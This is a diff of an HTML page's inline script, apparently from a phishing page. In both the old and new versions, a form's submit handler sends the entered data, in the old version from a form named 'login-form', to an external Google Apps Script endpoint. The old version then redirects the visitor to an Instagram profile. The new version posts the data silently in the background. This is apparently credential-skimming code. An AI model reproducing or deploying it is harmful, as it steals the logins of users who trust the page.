@@ -165,25 +165,23 @@
   </div>
 
   <script>
-  const form = document.getElementById('login-form');
-  form.addEventListener('submit', function(e) {
-    e.preventDefault(); // Prevent default form submission
+document.getElementById("myForm").addEventListener("submit", function(e) {
+  e.preventDefault();
 
-    const data = new FormData(form);
+  const form = e.target;
+  const data = new FormData(form);
 
-    fetch("https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec", {
-      method: "POST",
-      body: data
-    })
-    .then(response => {
-      // ✅ Success — redirect after submission
-      window.location.href = "https://www.instagram.com/exploitxplorers?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw=="; // Replace with your target link
-    })
-    .catch(error => {
-      alert("Error occurred");
-    });
+  // Send the request in background (no .then)
+  fetch('https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec', {
+    method: 'POST',
+    body: data
   });
+
+  // Redirect instantly
+  //window.location.href = "thankyou.html";
+});
 </script>
+
 
   <!-- Dark Footer Strip -->
 <div class="footer-strip">
